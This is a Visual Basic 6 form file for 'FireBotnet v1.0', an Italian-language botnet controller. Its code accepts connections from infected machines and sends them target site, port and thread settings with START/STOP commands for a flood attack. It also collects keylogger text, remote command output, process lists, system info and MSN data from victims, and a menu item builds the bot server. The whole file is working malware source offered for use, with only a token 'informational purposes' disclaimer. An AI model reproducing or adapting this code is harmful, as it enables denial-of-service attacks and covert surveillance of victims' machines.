VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "FireBotnet v1.0 by xXManuddXx"
   ClientHeight    =   10035
   ClientLeft      =   4290
   ClientTop       =   1965
   ClientWidth     =   10470
   LinkTopic       =   "Form1"
   ScaleHeight     =   10035
   ScaleWidth      =   10470
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command9 
      Caption         =   "Disconnetti Computer"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   5640
      Style           =   1  'Graphical
      TabIndex        =   26
      Top             =   3120
      Width           =   4215
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Disistalla Server"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   5640
      TabIndex        =   24
      Top             =   5040
      Width           =   4215
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Riavvia Connessione"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   5640
      TabIndex        =   23
      Top             =   4560
      Width           =   4215
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Chiudi Connessione "
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   5640
      TabIndex        =   22
      Top             =   4080
      Width           =   4215
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Apri Controllo Remoto"
      DisabledPicture =   "Form1.frx":0000
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   5640
      TabIndex        =   21
      Top             =   3600
      Width           =   4215
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Connetti Un Computer"
      DownPicture     =   "Form1.frx":0D62
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   5640
      Picture         =   "Form1.frx":1464
      TabIndex        =   20
      Top             =   2640
      Width           =   4215
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Carica Fuoco!!"
      Height          =   255
      Left            =   1320
      TabIndex        =   16
      Top             =   4080
      Width           =   2775
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Stoppa Attacco"
      Height          =   375
      Left            =   3120
      TabIndex        =   11
      Top             =   4680
      Width           =   1695
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Avvia Attacco"
      Height          =   375
      Left            =   240
      TabIndex        =   10
      Top             =   4680
      Width           =   1695
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   1560
      TabIndex        =   9
      Text            =   "2"
      Top             =   3600
      Width           =   2415
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   3120
      TabIndex        =   5
      Text            =   "80"
      Top             =   2520
      Width           =   1935
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   4
      Text            =   "Sito Vittima"
      Top             =   2520
      Width           =   2535
   End
   Begin VB.ListBox List1 
      Height          =   2400
      Left            =   120
      TabIndex        =   2
      Top             =   6720
      Width           =   10215
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Index           =   0
      Left            =   9840
      Top             =   6120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label19 
      AutoSize        =   -1  'True
      Caption         =   "Chiamte Dai Computer Remoti"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   3840
      TabIndex        =   31
      Top             =   6360
      Width           =   2820
   End
   Begin VB.Label Label18 
      Caption         =   "..."
      Height          =   255
      Left            =   5400
      TabIndex        =   30
      Top             =   9600
      Visible         =   0   'False
      Width           =   1335
   End
   Begin VB.Label Label17 
      Caption         =   "."
      Height          =   255
      Left            =   6720
      TabIndex        =   29
      Top             =   9600
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.Label Label16 
      AutoSize        =   -1  'True
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   9000
      TabIndex        =   28
      Top             =   360
      Width           =   180
   End
   Begin VB.Label Label15 
      AutoSize        =   -1  'True
      Caption         =   "Bot che attaccano:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   6120
      TabIndex        =   27
      Top             =   360
      Width           =   2595
   End
   Begin VB.Image Image1 
      Height          =   600
      Left            =   480
      Picture         =   "Form1.frx":1B66
      Top             =   240
      Width           =   600
   End
   Begin VB.Label Label14 
      Caption         =   "0"
      Height          =   255
      Left            =   8280
      TabIndex        =   25
      Top             =   9600
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.Label Label13 
      AutoSize        =   -1  'True
      Caption         =   "Nessuno"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   7560
      TabIndex        =   19
      Top             =   1920
      Width           =   1065
   End
   Begin VB.Label Label12 
      AutoSize        =   -1  'True
      Caption         =   "Sei Connesso A:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   5400
      TabIndex        =   18
      Top             =   1920
      Width           =   2010
   End
   Begin VB.Label Label11 
      AutoSize        =   -1  'True
      Caption         =   "Funzione Trojan"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   435
      Left            =   6360
      TabIndex        =   17
      Top             =   1200
      Width           =   2865
   End
   Begin VB.Label Label10 
      AutoSize        =   -1  'True
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   435
      Left            =   4320
      TabIndex        =   15
      Top             =   360
      Width           =   225
   End
   Begin VB.Label Label9 
      AutoSize        =   -1  'True
      Caption         =   "Computer Online:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   435
      Left            =   1200
      TabIndex        =   14
      Top             =   360
      Width           =   3090
   End
   Begin VB.Label Label8 
      AutoSize        =   -1  'True
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   2640
      TabIndex        =   13
      Top             =   5640
      Width           =   180
   End
   Begin VB.Label Label7 
      AutoSize        =   -1  'True
      Caption         =   "Connessioni Totali Effettuate"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   720
      TabIndex        =   12
      Top             =   5280
      Width           =   3990
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      Caption         =   "Thereads"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   435
      Left            =   1920
      TabIndex        =   8
      Top             =   3000
      Width           =   1695
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      Caption         =   "Porta"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   435
      Left            =   3600
      TabIndex        =   7
      Top             =   1920
      Width           =   945
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      Caption         =   "Sito"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   435
      Left            =   240
      TabIndex        =   6
      Top             =   1920
      Width           =   705
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      Caption         =   "Funzione BotNet"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   435
      Left            =   1200
      TabIndex        =   3
      Top             =   1200
      Width           =   2925
   End
   Begin VB.Line Line3 
      X1              =   0
      X2              =   10560
      Y1              =   960
      Y2              =   960
   End
   Begin VB.Line Line2 
      X1              =   5160
      X2              =   5160
      Y1              =   0
      Y2              =   6480
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "Disconnesso"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   2160
      TabIndex        =   1
      Top             =   9600
      Width           =   1560
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Stato Del Client:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   120
      TabIndex        =   0
      Top             =   9600
      Width           =   1995
   End
   Begin VB.Line Line1 
      X1              =   0
      X2              =   10440
      Y1              =   9360
      Y2              =   9360
   End
   Begin VB.Menu pop1 
      Caption         =   "Opzioni"
      Begin VB.Menu pop2 
         Caption         =   "Stop Ascolto"
      End
      Begin VB.Menu pop4 
         Caption         =   "Riavvia Ascolto"
      End
      Begin VB.Menu pop3 
         Caption         =   "Cambia Porta Di Ascolto"
      End
      Begin VB.Menu pop5 
         Caption         =   "Crea Botnet Server(Build)"
      End
      Begin VB.Menu pop7 
         Caption         =   "Info"
      End
      Begin VB.Menu pop6 
         Caption         =   "Esci"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim SocketNumber As Long

Private Sub Command1_Click()
Dim n As Integer
For n = 1 To SocketNumber
If Not n = Index Then
If Winsock1(n).State = sckConnected Then
Winsock1(n).SendData "START"
DoEvents
End If
End If
Next
End Sub

Private Sub Command2_Click()
Dim n As Integer
For n = 1 To SocketNumber
If Not n = Index Then
If Winsock1(n).State = sckConnected Then
Winsock1(n).SendData "STOP"
DoEvents
End If
End If
Next
End Sub

Private Sub Command3_Click()
Dim n As Integer
For n = 1 To SocketNumber
If Not n = Index Then
If Winsock1(n).State = sckConnected Then
Winsock1(n).SendData "SITE|" & Text1.Text
DoEvents
Winsock1(n).SendData "PORT|" & Text2.Text
DoEvents
Winsock1(n).SendData "TR|" & Text3.Text
DoEvents
End If
End If
Next
MsgBox "Caricamento eseguito con successo", vbInformation, "Completato"
End Sub

Private Sub Command4_Click()
On Error Resume Next
Dim data() As String
data() = Split(List1.Text, "|")
Label14.Caption = data(0)
Label13.Caption = "Computer : " & Winsock1(data(0)).RemoteHostIP

DoEvents
If Winsock1(Form1.Label14.Caption).State = 7 Then
 Command5.Enabled = True
List1.Enabled = False
 Else
 MsgBox "Non Sei Connesso A Nessun Computer", vbExclamation


End If

End Sub

Private Sub Command5_Click()
Form4.Show

End Sub

Private Sub Command6_Click()
On Error Resume Next
Dim data() As String
data() = Split(List1.Text, "|")
Label14.Caption = data(0)
Winsock1(Form1.Label14.Caption).SendData "close"
List1.RemoveItem List1.ListIndex


Label10.Caption = Label10.Caption - 1
If Label10.Caption < 0 Then
Label10.Caption = 0
End If



End Sub

Private Sub Command7_Click()
On Error Resume Next
Dim data() As String
data() = Split(List1.Text, "|")
Label14.Caption = data(0)
Winsock1(Form1.Label14.Caption).SendData "riavvia"
DoEvents
Winsock1(Form1.Label14.Caption).Close
Label10.Caption = Label10.Caption - 1
If Label10.Caption < 0 Then
Label10.Caption = 0
End If

End Sub

Private Sub Command8_Click()
On Error Resume Next
Dim data() As String
data() = Split(List1.Text, "|")
Label14.Caption = data(0)
Winsock1(Form1.Label14.Caption).SendData "uninstall"
Label10.Caption = Label10.Caption - 1
If Label10.Caption < 0 Then
Label10.Caption = 0
End If

End Sub

Private Sub Command9_Click()
List1.Enabled = True
Command5.Enabled = False

End Sub

Private Sub Form_Load()
Winsock1(0).LocalPort = Form2.Text1.Text
Winsock1(0).Listen
Label2.Caption = "In Ascolto sulla porta: " & Form2.Text1.Text

End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub pop2_Click()
Dim n As Integer
For n = 1 To SocketNumber
Winsock1(n).Close
Unload Winsock1(n)
Next n
Winsock1(0).Close
List1.Clear
SocketNumber = 0
Label2.Caption = "Disconnesso"
End Sub

Private Sub pop3_Click()
Form2.Show
End Sub

Private Sub pop4_Click()
On Error Resume Next

Dim n As Integer
For n = 1 To SocketNumber
Winsock1(n).Close
Next n
Winsock1(0).Close
Winsock1(0).LocalPort = Form2.Text1.Text
Winsock1(0).Listen
Label2.Caption = "In Ascolto sulla porta: " & Form2.Text1.Text
End Sub

Private Sub pop5_Click()
Form3.Show

End Sub

Private Sub pop6_Click()
End
End Sub

Private Sub pop7_Click()
MsgBox "Programma Creato e codato da xXManuddXx , marijuanatime92 " & vbCrLf & "Programma creato a solo scopo informativo non mi assumo responabilità dell'uso che ne farete " & vbCrLf & "per maggiori info contattatemi su xXManuddXx@hotmail.it :)" & vbCrLf & "Buon Divertimento by xXManuddXx", vbInformation, "xXManuddXx Info"
End Sub

Private Sub Winsock1_Close(Index As Integer)
Winsock1(Index).Close
List1.AddItem Winsock1(Index).Index & "Il Computer   " & Winsock1(Index).RemoteHostIP & "si è disconnesso    "
Unload Winsock1(Index)
Label10.Caption = SocketNumber

End Sub

Private Sub Winsock1_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error Resume Next
SocketNumber = SocketNumber + 1
Load Winsock1(SocketNumber)
Winsock1(SocketNumber).Accept requestID
List1.AddItem SocketNumber & " |  " & Winsock1(SocketNumber).RemoteHostIP
Winsock1(SocketNumber).SendData "Name"
DoEvents


Label10.Caption = Label10.Caption + 1
If Label10.Caption < 0 Then
Label10.Caption = 0
End If




End Sub

Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim data As String
Dim data2() As String
Winsock1(Index).GetData data
data2 = Split(data, "|")
If data2(0) = "ATK" Then
Label16.Caption = Label16.Caption + 1
End If
If data2(0) = "CON" Then
Label8.Caption = data2(1)
End If

If data2(0) = "KL" Then
Form7.Text1.Text = data2(1)
End If
If data2(0) = "chat" Then
Form14.List1.AddItem data2(1)
Form14.List1.ListIndex = Form14.List1.NewIndex
End If
If data2(0) = "Name" Then
Label17.Caption = data2(1)
Label18.Caption = data2(2)
Dim x As Form
Dim f As New Form6
f.Show
End If
If data2(0) = "processrecive" Then
Dim process As String
Do
            process = Extract(data2(1))
            Form20.List1.AddItem (process)
            data2(1) = Mid(data2(1), Len(process) + 2, Len(data2(1)))
            If Len(data2(1)) < 1 Then Exit Do
        Loop
End If
If data2(0) = "INFO" Then
Form21.Text1.Text = data2(1)
Form21.Text2.Text = data2(2)
Form21.Text3.Text = data2(3)
Form21.Text4.Text = data2(4)
Form21.Text5.Text = data2(5)
Form21.Text6.Text = data2(6)
Form21.Text7.Text = data2(7)
Form21.Text8.Text = data2(8)
End If
If data2(0) = "cmdrecive" Then
Form11.Text2.Text = Form11.Text2.Text & data2(1)


End If
If data2(0) = "Errore" Then
MsgBox "Errore Esecuzione", vbCritical

End If
If data2(0) = "msnrecive" Then
Form19.Text3.Text = data2(1)
End If


End Sub
